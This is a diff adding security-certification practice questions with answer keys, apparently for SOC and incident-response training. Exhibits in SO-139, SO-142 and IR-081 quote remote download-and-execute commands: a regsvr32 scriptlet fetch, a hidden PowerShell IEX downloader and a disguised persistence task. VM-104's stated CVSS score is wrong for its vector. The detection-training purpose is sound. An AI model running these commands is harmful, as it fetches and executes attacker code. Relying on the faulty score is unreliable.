@@ -13830,5 +13830,444 @@
       }
     ],
     "explanation": "Mapping a finding to a specific control number (CIS Benchmark, PCI DSS requirement, etc.) lets compliance stakeholders and auditors directly verify which requirement is at issue without needing to independently interpret raw technical detail -- that's the entire point of compliance findings reporting. It's a functional, not cosmetic, addition. CVEs identify specific vulnerabilities in software; compliance framework control numbers identify specific policy/configuration requirements -- they're different reference systems serving different purposes, not the same standard under two names. Control mapping is specifically valuable for auditor/compliance audiences, the opposite of being inappropriate for them."
+  },
+  {
+    "external_key": "SO-139",
+    "domain": "SO",
+    "subtopic": "Indicators of Malicious Activity",
+    "difficulty": 5,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "A Sysmon excerpt from a domain-joined workstation is shown below. What is the MOST direct explanation for what's happening here?",
+    "exhibit": "Sysmon Event ID: 1 (Process Create)\nUtcTime: 2026-08-30 14:02:11\nImage: C:\\Windows\\System32\\regsvr32.exe\nParentImage: C:\\Windows\\System32\\cmd.exe\nCommandLine: regsvr32.exe /s /n /u /i:http://185.221.94[.]17/payload.sct scrobj.dll\nUser: CORP\\svc_backup\nIntegrityLevel: Medium\n\nSysmon Event ID: 3 (Network Connection)\nUtcTime: 2026-08-30 14:02:12\nImage: C:\\Windows\\System32\\regsvr32.exe\nDestinationIp: 185.221.94.17\nDestinationPort: 80",
+    "choices": [
+      {
+        "label": "A",
+        "body": "A legitimate COM component registration, since regsvr32 is a standard signed Windows utility for this purpose",
+        "correct": false
+      },
+      {
+        "label": "B",
+        "body": "A Squiblydoo-style LOLBin attack: regsvr32 is being abused to execute a remote scriptlet, bypassing normal application whitelisting.",
+        "correct": true
+      },
+      {
+        "label": "C",
+        "body": "A false positive triggered purely by the use of an IP address instead of a hostname in the command line",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "A routine software update check, since outbound port 80 traffic from System32 binaries is expected background activity",
+        "correct": false
+      }
+    ],
+    "explanation": "This is the well-documented \"Squiblydoo\" technique: regsvr32's undocumented /i flag lets it fetch and execute a remote .sct scriptlet over HTTP, all from a signed Microsoft binary — a classic LOLBin technique used specifically to evade application whitelisting that would block an unsigned or unknown executable. Standard COM registration doesn't use /u /i with a remote URL and doesn't open a network connection to an untrusted external IP. The IP-vs-hostname distinction isn't what makes this suspicious — the flag combination and remote fetch are. And regsvr32 has no legitimate 'update check' behavior; a service account (svc_backup) invoking it interactively via cmd.exe to reach an external IP on port 80 is exactly the pattern this technique produces."
+  },
+  {
+    "external_key": "SO-140",
+    "domain": "SO",
+    "subtopic": "Indicators of Malicious Activity",
+    "difficulty": 5,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "A Linux authentication log excerpt from an internet-facing jump host is shown below. What does this excerpt MOST likely represent?",
+    "exhibit": "Aug 30 03:14:02 jump01 sshd[4021]: Failed password for root from 103.41.22.9 port 51234 ssh2\nAug 30 03:14:03 jump01 sshd[4022]: Failed password for root from 103.41.22.9 port 51240 ssh2\nAug 30 03:14:04 jump01 sshd[4023]: Failed password for admin from 103.41.22.9 port 51248 ssh2\nAug 30 03:14:05 jump01 sshd[4024]: Failed password for oracle from 103.41.22.9 port 51255 ssh2\n... (312 more lines, same source IP, 47 distinct usernames) ...\nAug 30 03:19:47 jump01 sshd[4390]: Accepted password for backup_svc from 103.41.22.9 port 52011 ssh2",
+    "choices": [
+      {
+        "label": "A",
+        "body": "A misconfigured monitoring tool retrying a stale credential, since the failures all originate from a single consistent source",
+        "correct": false
+      },
+      {
+        "label": "B",
+        "body": "A successful password-spray/brute-force attack: many usernames tried rapidly from one source, ending in a valid login on a weak or default account.",
+        "correct": true
+      },
+      {
+        "label": "C",
+        "body": "Normal login noise, since SSH failed-password entries are routine and don't warrant investigation on their own",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "A DNS resolution failure being logged as an authentication failure by sshd due to a misconfigured PTR record",
+        "correct": false
+      }
+    ],
+    "explanation": "Dozens of usernames attempted in rapid succession from one source IP, followed by a successful login, is the signature of a password-spray/brute-force attack succeeding — and \"backup_svc\" is exactly the kind of service account that often carries a weak or default credential. A monitoring tool retrying one stale credential wouldn't cycle through 47 different usernames. Failed-password log noise from a single source at this volume and username diversity is well past what should be dismissed as routine — it's a textbook precursor to exactly the successful login line that follows. sshd's \"Failed password\" message reflects an authentication failure against a presented credential, not a DNS/PTR resolution issue."
+  },
+  {
+    "external_key": "SO-141",
+    "domain": "SO",
+    "subtopic": "Email Security",
+    "difficulty": 4,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "An email claiming to be from the CFO requests an urgent wire transfer. The message headers are shown below. What do these headers indicate?",
+    "exhibit": "Authentication-Results: mx.corp.com;\n  spf=fail (sender IP is 41.203.88.12) smtp.mailfrom=cfo@corp-finance.net;\n  dkim=none (message not signed);\n  dmarc=fail (p=reject sp=reject) header.from=corp-finance.net\nFrom: \"Jane Rivera (CFO)\" <cfo@corp-finance.net>\nReply-To: j.rivera.finance@protonmail.com",
+    "choices": [
+      {
+        "label": "A",
+        "body": "This is a routine delivery warning and can be disregarded, since SPF/DKIM/DMARC failures commonly occur on legitimate internal mail",
+        "correct": false
+      },
+      {
+        "label": "B",
+        "body": "The sending domain failed all three checks and the reply-to doesn't match the sender — strong indicators of a spoofed/BEC attempt the domain's own DMARC policy says to reject.",
+        "correct": true
+      },
+      {
+        "label": "C",
+        "body": "The DMARC result is irrelevant here since only SPF failure matters for detecting spoofing",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "This is a false positive caused solely by the CFO sending from a personal mobile device outside the corporate network",
+        "correct": false
+      }
+    ],
+    "explanation": "All three authentication mechanisms failed: SPF fails because the sending IP isn't authorized for corp-finance.net, DKIM has no signature at all, and DMARC fails and explicitly specifies p=reject — meaning corp-finance.net's own published policy says mail like this should be rejected outright. The mismatched Reply-To (a free webmail address, not a corporate one) is a second independent red flag layered on top, textbook of a BEC/spoofing attempt. None of the three checks are optional to consider — SPF alone dismissing DKIM/DMARC misses that DMARC's p=reject is the domain owner's explicit instruction on how to handle exactly this failure combination. A legitimate employee sending from a personal device wouldn't cause spoofed SPF/DKIM/DMARC results against a different external domain — device choice affects sending infrastructure, not domain authentication outcomes like this."
+  },
+  {
+    "external_key": "SO-142",
+    "domain": "SO",
+    "subtopic": "Indicators of Malicious Activity",
+    "difficulty": 5,
+    "is_multi": true,
+    "select_n": 2,
+    "stem": "A Sysmon excerpt for a process on a finance workstation is shown below. Select the TWO details that are the strongest indicators of malicious activity.",
+    "exhibit": "Sysmon Event ID: 1 (Process Create)\nUtcTime: 2026-08-30 22:47:03\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentImage: C:\\Windows\\explorer.exe\nCommandLine: powershell.exe -windowstyle hidden -ep bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/i.ps1')\"\nUser: CORP\\j.alvarez\nCurrentDirectory: C:\\Users\\j.alvarez\\Downloads\\\nIntegrityLevel: Medium\nParentProcessId: 3312\nLogonId: 0x8a2f1",
+    "choices": [
+      {
+        "label": "A",
+        "body": "The command line combines a hidden window, execution-policy bypass, and a remote download-and-execute (IEX + DownloadString) — the core of a fileless PowerShell downloader.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "explorer.exe as the parent process, which on its own is a strong indicator since PowerShell is rarely spawned that way in practice",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "The working directory being the Downloads folder, consistent with a payload staged from a recently downloaded file (e.g., a malicious document or shortcut) launching PowerShell.",
+        "correct": true
+      },
+      {
+        "label": "D",
+        "body": "IntegrityLevel: Medium, which is itself unusual for a legitimate user process and indicates privilege escalation",
+        "correct": false
+      },
+      {
+        "label": "E",
+        "body": "The LogonId value, since a hexadecimal logon ID format is only ever seen in compromised sessions",
+        "correct": false
+      }
+    ],
+    "explanation": "The command line is the clearest single red flag: -windowstyle hidden plus -ep bypass plus an IEX/DownloadString one-liner is the canonical fileless PowerShell downloader pattern, regardless of what spawned it. The Downloads-folder working directory is a meaningful secondary signal — it fits the common chain of a user opening a downloaded file (a malicious LNK, macro doc, or HTA) that in turn launches PowerShell from that same folder. explorer.exe as a parent is actually completely normal — it's the parent of anything a user double-clicks, including legitimate PowerShell shortcuts, so it carries no signal on its own. Medium integrity is the standard, default level for an ordinary user process; it does not indicate escalation (that would show as High/System). LogonId is just a session identifier used for correlating events to a single logon session — its hex format is routine and carries no inherent malicious signal."
+  },
+  {
+    "external_key": "SO-143",
+    "domain": "SO",
+    "subtopic": "Threat Hunting",
+    "difficulty": 5,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "A NetFlow summary for one internal host over a 4-hour window is shown below. What does this pattern most strongly suggest?",
+    "exhibit": "SrcIP        DstIP           DstPort  Bytes   Time\n10.20.4.81   203.0.113.44    443      1,204   09:00:02\n10.20.4.81   203.0.113.44    443      1,198   09:15:01\n10.20.4.81   203.0.113.44    443      1,211   09:30:03\n10.20.4.81   203.0.113.44    443      1,203   09:45:02\n10.20.4.81   203.0.113.44    443      1,209   10:00:01\n... (pattern continues every 15 minutes, exact byte count varies by only a few bytes, through 13:00) ...",
+    "choices": [
+      {
+        "label": "A",
+        "body": "Normal HTTPS browsing traffic, since port 443 is standard for legitimate encrypted web traffic",
+        "correct": false
+      },
+      {
+        "label": "B",
+        "body": "A CDN health-check or load balancer keepalive, which is the most common cause of any fixed-interval outbound connection",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "C2 beaconing: the regular 15-minute interval and near-identical byte count fit malware checking in with a C2 server, not organic browsing.",
+        "correct": true
+      },
+      {
+        "label": "D",
+        "body": "This is inconclusive on its own and cannot suggest anything without also inspecting the full packet payload",
+        "correct": false
+      }
+    ],
+    "explanation": "Organic user browsing produces irregular, bursty traffic tied to human behavior — this pattern is the opposite: a fixed 15-minute cadence with byte counts varying by single digits for four straight hours, which is the classic signature of automated malware beaconing to a C2 server rather than a person browsing. A CDN/load-balancer keepalive is a server-side pattern, not something a workstation's outbound client traffic to a single external IP would typically produce this consistently. Dismissing it as inconclusive without payload inspection undersells what NetFlow metadata alone can reveal — the interval regularity and volume consistency are themselves strong behavioral indicators that justify escalation and further investigation (including payload inspection), not a reason to withhold judgment entirely."
+  },
+  {
+    "external_key": "VM-104",
+    "domain": "VM",
+    "subtopic": "CVSS / Prioritization",
+    "difficulty": 5,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "A finding carries the CVSS v3.1 vector below. A junior analyst says \"Scope: Changed doesn't matter much since Confidentiality/Integrity/Availability are already High.\" What's the correct read of the Scope metric here?\n\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+    "exhibit": null,
+    "choices": [
+      {
+        "label": "A",
+        "body": "The analyst is right; Scope only matters when at least one impact metric is Low or None",
+        "correct": false
+      },
+      {
+        "label": "B",
+        "body": "Scope: Changed means exploitation reaches beyond the vulnerable component itself (e.g., a container escape reaching the host), pushing this near the top of the scale.",
+        "correct": true
+      },
+      {
+        "label": "C",
+        "body": "Scope: Changed is purely descriptive metadata with zero effect on the numeric Base Score in CVSS v3.1",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "Scope only applies to Temporal scoring and should be ignored when calculating the Base Score",
+        "correct": false
+      }
+    ],
+    "explanation": "Scope: Changed specifically means the vulnerability lets an attacker affect resources beyond the vulnerable component's own security authority — like a container escape reaching the host, or a web app vulnerability reaching the underlying OS. Far from being irrelevant here, a Changed scope combined with network attack vector, low complexity, no privileges/interaction required, and High C/I/A pushes this vector to a Critical score (this specific vector scores 9.8) — dismissing it as unimportant badly undersells the finding. Scope isn't metadata-only; it's an active multiplier in the CVSS v3.1 Base Score formula, and it isn't confined to Temporal scoring, which covers entirely different factors (exploit maturity, remediation level, report confidence)."
+  },
+  {
+    "external_key": "VM-105",
+    "domain": "VM",
+    "subtopic": "Scanning Methodology",
+    "difficulty": 4,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "An Nmap scan result against a server that should only be running a web application is shown below. Which finding is the MOST urgent to investigate?",
+    "exhibit": "PORT      STATE SERVICE     VERSION\n80/tcp    open  http        nginx 1.24.0\n443/tcp   open  https       nginx 1.24.0\n3389/tcp  open  ms-wbt-server  Microsoft Terminal Services\n8080/tcp  open  http-proxy  Squid 5.7",
+    "choices": [
+      {
+        "label": "A",
+        "body": "Port 80/tcp, since any unencrypted HTTP port is inherently the highest-severity finding on a server regardless of context",
+        "correct": false
+      },
+      {
+        "label": "B",
+        "body": "Port 3389/tcp — RDP exposed on a server that should only be running a web app is a significant, unexpected attack surface and warrants immediate investigation.",
+        "correct": true
+      },
+      {
+        "label": "C",
+        "body": "Port 443/tcp, since HTTPS ports are generally considered higher risk than HTTP ports due to the added complexity of TLS",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "The nginx version number itself, since any specific version disclosure is automatically the most critical finding regardless of whether it's actually outdated",
+        "correct": false
+      }
+    ],
+    "explanation": "RDP (3389) being open on a host that's supposed to be a single-purpose web server is exactly the kind of unexpected, unaccounted-for service that scanning is meant to catch — it's a significant attack surface expansion (remote interactive login) that doesn't belong in the server's intended role, and warrants immediate investigation into why it's there and who can reach it. Ports 80 and 443 are expected for the stated purpose (a web application) and aren't automatically high-severity just for existing — severity depends on context, not the protocol alone, and HTTPS isn't inherently riskier than HTTP just because TLS adds complexity. A version banner alone isn't automatically critical either — it only matters if that specific version carries a known vulnerability, which isn't established here."
+  },
+  {
+    "external_key": "VM-106",
+    "domain": "VM",
+    "subtopic": "CVSS / Prioritization",
+    "difficulty": 5,
+    "is_multi": true,
+    "select_n": 2,
+    "stem": "A vulnerability management dashboard shows the four open findings below. Select the TWO findings that should be prioritized for remediation FIRST.\n\nFinding 1: CVSS 9.8, EPSS 0.03, internal-only isolated lab VM, no internet path\nFinding 2: CVSS 7.2, EPSS 0.89, internet-facing customer login portal\nFinding 3: CVSS 6.1, EPSS 0.05, internal HR file share, standard segmentation\nFinding 4: CVSS 8.4, EPSS 0.71, internet-facing API gateway, actively exploited per current threat intel",
+    "exhibit": null,
+    "choices": [
+      {
+        "label": "A",
+        "body": "Finding 1, purely because it carries the numerically highest CVSS Base Score",
+        "correct": false
+      },
+      {
+        "label": "B",
+        "body": "Finding 2 — high EPSS (89th percentile) on an internet-facing login portal makes it high-urgency despite a merely High, not Critical, CVSS score.",
+        "correct": true
+      },
+      {
+        "label": "C",
+        "body": "Finding 3, since HR data sensitivity should generally override technical exploitability signals",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "Finding 4 — high CVSS, high EPSS, internet-facing, AND already being actively exploited in the wild makes this the clearest top-priority finding.",
+        "correct": true
+      }
+    ],
+    "explanation": "Finding 4 checks every box for urgency: high severity, high exploitation probability, exposed to the internet, and confirmed active exploitation — about as unambiguous a top-priority finding as this kind of dashboard produces. Finding 2 backs it up: even though its CVSS (7.2, High) is lower than Finding 1's Critical 9.8, its EPSS of 0.89 and internet-facing customer-login exposure make it a materially more urgent real-world risk than a Critical-scored finding sitting on an isolated lab VM with no path in. Finding 1's high CVSS is exactly the trap this scenario is testing: Base Score alone, without considering exploitation likelihood (EPSS) or actual reachability, overstates urgency for an asset nothing can currently reach. Finding 3 has a moderate CVSS and very low EPSS on a segmented internal share — sensitivity of the data matters, but it doesn't override exploitability signals outright; it's one input among several, not an automatic trump card."
+  },
+  {
+    "external_key": "IR-080",
+    "domain": "IR",
+    "subtopic": "Network Architecture",
+    "difficulty": 5,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "During an incident investigation, a firewall rule export for the DMZ segment is pulled. Which rule is the MOST likely explanation for how an attacker who compromised the DMZ web server reached the internal payroll database?",
+    "exhibit": "Rule 12: ALLOW  src=DMZ_WEB    dst=INTERNAL_DB_SUBNET  port=1433  proto=tcp\nRule 13: ALLOW  src=DMZ_WEB    dst=ANY                 port=443   proto=tcp\nRule 14: DENY   src=DMZ_WEB    dst=INTERNAL_HR_SUBNET  port=ANY   proto=any\nRule 15: ALLOW  src=INTERNAL   dst=DMZ_WEB             port=8443  proto=tcp",
+    "choices": [
+      {
+        "label": "A",
+        "body": "Rule 12 — it permits the DMZ web server direct TCP access to the internal database subnet on the SQL Server port, a direct low-trust-to-high-trust path.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "Rule 13, since any ALLOW rule targeting ANY destination is automatically the most dangerous regardless of the specific port or subnet involved",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "Rule 14, since DENY rules are what attackers exploit to move laterally by design",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "Rule 15, since internal-to-DMZ traffic is typically treated as a bigger risk than DMZ-to-internal traffic",
+        "correct": false
+      }
+    ],
+    "explanation": "Rule 12 is the direct explanation: it's an explicit allow from the DMZ web server straight into the internal database subnet on port 1433 (SQL Server) — exactly the kind of low-trust-to-high-trust path that turns a single compromised DMZ host into a route to sensitive internal data, matching the scenario's payroll-database compromise. Rule 13 allows outbound HTTPS to anywhere, which is broad but is an outbound web-browsing-style rule, not a path into the internal database subnet described in the incident. Rule 14 is a DENY — it blocks DMZ-to-HR traffic, which is the opposite of an exploitable path; DENY rules don't grant attackers access. Rule 15 only allows internal hosts to reach the DMZ web server on 8443 (the normal direction of a management/admin connection into a DMZ host) — it doesn't grant the DMZ server any path into internal systems, so it can't explain this specific compromise direction."
+  },
+  {
+    "external_key": "IR-081",
+    "domain": "IR",
+    "subtopic": "Digital Forensics",
+    "difficulty": 5,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "A scheduled task definition recovered from a compromised server is shown below. What does this most likely represent?",
+    "exhibit": "TaskName: \\Microsoft\\Windows\\WindowsUpdate\\SystemHealthCheck\nAuthor: SYSTEM\nTrigger: At log on of any user, and daily at 03:17\nAction: cmd.exe /c powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://51.89.190[.]203/update.ps1')\"\nRunLevel: Highest privileges",
+    "choices": [
+      {
+        "label": "A",
+        "body": "A legitimate Windows Update maintenance task, since the task path and name reference Microsoft's WindowsUpdate namespace",
+        "correct": false
+      },
+      {
+        "label": "B",
+        "body": "A persistence mechanism: a scheduled task disguised with a legitimate-sounding Microsoft path/name, re-launching a hidden PowerShell downloader on every logon and daily, at highest privileges.",
+        "correct": true
+      },
+      {
+        "label": "C",
+        "body": "An artifact of a prior, already-remediated infection with no ongoing relevance to the current investigation",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "A false positive, since scheduled tasks running at SYSTEM/highest privileges are routine on Windows servers and rarely worth investigating on their own",
+        "correct": false
+      }
+    ],
+    "explanation": "Naming a malicious task to mimic a legitimate Microsoft path (\\Microsoft\\Windows\\WindowsUpdate\\...) is a common technique to blend in with genuine scheduled tasks during casual review — the name alone proves nothing. What actually matters is the action: a hidden-window PowerShell one-liner downloading and executing remote code, triggered both at every logon and daily, running at the highest privilege level — that's a durable, high-privilege persistence mechanism, not routine maintenance. Recovering this artifact during an active investigation of a compromised server means it's live evidence of the persistence method, not something to assume is already resolved. And while SYSTEM-level scheduled tasks are common on Windows, that alone doesn't make every one benign — the specific action content here is what makes this one worth immediate attention, not the mere fact that elevated scheduled tasks exist."
+  },
+  {
+    "external_key": "IR-082",
+    "domain": "IR",
+    "subtopic": "Digital Forensics",
+    "difficulty": 5,
+    "is_multi": true,
+    "select_n": 2,
+    "stem": "A compromised server must be taken offline for forensic imaging. Select the TWO actions that should happen BEFORE the machine is powered off, per order of volatility.",
+    "exhibit": null,
+    "choices": [
+      {
+        "label": "A",
+        "body": "Capture a full memory (RAM) dump, since volatile memory contents (running processes, encryption keys, network connections) are lost the instant power is cut.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "Record the current state of active network connections and running processes, since this live-state data disappears on shutdown just like memory contents.",
+        "correct": true
+      },
+      {
+        "label": "C",
+        "body": "Immediately reimage the disk from a known-good backup to restore service as fast as possible",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "Delete any suspicious files identified so far, to prevent them from being an active threat while imaging is arranged",
+        "correct": false
+      },
+      {
+        "label": "E",
+        "body": "Notify the business unit that the server will be briefly unavailable during the power-off, with no other action needed first",
+        "correct": false
+      }
+    ],
+    "explanation": "Order of volatility puts RAM (running processes, network state, encryption keys, injected code that never touches disk) at the top, precisely because it's gone the instant power is lost — so a memory dump and a snapshot of live network connections/processes are exactly what must happen before shutdown, while that data still exists. Reimaging from backup destroys the very evidence the investigation needs and skips the imaging step entirely — recovery comes after evidence preservation, not instead of it. Deleting suspicious files destroys evidence and can trigger anti-forensic side effects in malware designed to detect tampering — files should be preserved/imaged, not deleted, during an active investigation. A business notification is reasonable at some point in the process but isn't itself a forensic preservation step, and it's not what \"before power-off\" is asking about here."
+  },
+  {
+    "external_key": "RC-062",
+    "domain": "RC",
+    "subtopic": "Metrics",
+    "difficulty": 4,
+    "is_multi": true,
+    "select_n": 2,
+    "stem": "A monthly SOC metrics report lists: mean time to detect, mean time to remediate, phishing campaign click rate, and alert volume. Select the TWO metrics that most directly measure how quickly the team responds to threats, as opposed to measuring workload or awareness.",
+    "exhibit": null,
+    "choices": [
+      {
+        "label": "A",
+        "body": "Mean time to detect — how long a threat exists before it's identified, a direct measure of detection speed.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "Mean time to remediate — how long it takes to actually fix an identified issue, a direct measure of response/closure speed.",
+        "correct": true
+      },
+      {
+        "label": "C",
+        "body": "Phishing campaign click rate, since click rate is fundamentally a measure of team response speed rather than security awareness",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "Alert volume, since a higher raw count of alerts directly measures how quickly the team is responding to each one",
+        "correct": false
+      }
+    ],
+    "explanation": "MTTD and MTTR are the two timing metrics in this list — MTTD measures detection speed (time from compromise to identification), MTTR measures remediation speed (time from identification to resolution). Both are direct speed-of-response measures. Phishing click rate measures how susceptible employees are to a simulated phishing attempt — a security-awareness/training-effectiveness metric, not a measure of how fast the SOC responds to anything. Alert volume is a raw count of alerts generated or triaged — it reflects workload and tuning, not response speed; a team could have very high alert volume and still be fast, slow, or anywhere in between, since the two aren't the same measurement at all."
+  },
+  {
+    "external_key": "RC-063",
+    "domain": "RC",
+    "subtopic": "Compliance / Reporting",
+    "difficulty": 4,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "An excerpt from a vulnerability report going to the risk committee is shown below. What's missing that a risk committee would need to actually act on this?\n\n\"Finding: CVE-2026-31204, CVSS 9.1 (Critical), affects 14 hosts in the payments processing environment. Patch available.\"",
+    "exhibit": null,
+    "choices": [
+      {
+        "label": "A",
+        "body": "Nothing — a CVE, CVSS score, affected host count, and patch availability is a complete report for any audience",
+        "correct": false
+      },
+      {
+        "label": "B",
+        "body": "Business impact framing (what happens if unfixed, how fast), an owner, and a remediation timeline — the risk-committee \"so what\" that raw technical detail doesn't provide.",
+        "correct": true
+      },
+      {
+        "label": "C",
+        "body": "A full packet capture of the exploit traffic, since that is the minimum required detail for any risk committee report",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "The CVSS vector string broken out component by component, since committees require the full AV/AC/PR/UI/S/C/I/A breakdown to approve action",
+        "correct": false
+      }
+    ],
+    "explanation": "This excerpt is technically accurate but written for an engineer, not a risk committee — it's missing exactly what that audience needs to act: what the business impact/exposure actually is (payments processing environment implies real financial/compliance stakes, but that's not spelled out), who owns the fix, and by when. That's the core stakeholder-tailored reporting principle: the same underlying finding needs a different framing for a different audience. A packet capture is technical forensic detail with no place in a risk-committee summary. Breaking out the full CVSS vector component-by-component is exactly the kind of technical minutiae a business-risk audience doesn't need — they need the business consequence and the plan, not the scoring math."
   }
 ]
